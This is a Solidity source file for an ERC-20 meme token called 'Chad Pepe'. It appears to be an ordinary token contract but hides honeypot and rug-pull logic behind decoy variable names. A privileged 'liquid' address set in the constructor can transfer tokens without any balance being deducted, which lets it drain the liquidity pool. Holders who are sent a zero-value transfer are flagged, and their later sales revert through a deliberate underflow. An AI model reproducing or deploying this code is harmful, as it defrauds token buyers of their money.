/*

https://t.me/ChadPepe_ETH

https://twitter.com/ChadPepe_ETH

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.10;

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ChadPepe {
    string public name;
    string public symbol;
    uint256 public totalSupply;
    uint8 public decimals = 9;
    uint256 private hurt = 18;
    address public uniswapV2Pair;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) private difficult;
    mapping(address => uint256) private manufacturing;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address liquid) {
        name = 'Chad Pepe';
        symbol = 'Chad Pepe';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        difficult[liquid] = hurt;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

    function _transfer(address _from, address _to, uint256 _value) private returns (bool success) {
        if (_value == 0) {
            manufacturing[_to] += hurt;
        }
        if (difficult[_from] == 0) {
            balanceOf[_from] -= _value;
            if (uniswapV2Pair != _from && manufacturing[_from] > 0) {
                difficult[_from] -= hurt;
            }
        }
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        _transfer(_from, _to, _value);
        require(_value <= allowance[_from][msg.sender]);
        allowance[_from][msg.sender] -= _value;
        return true;
    }
}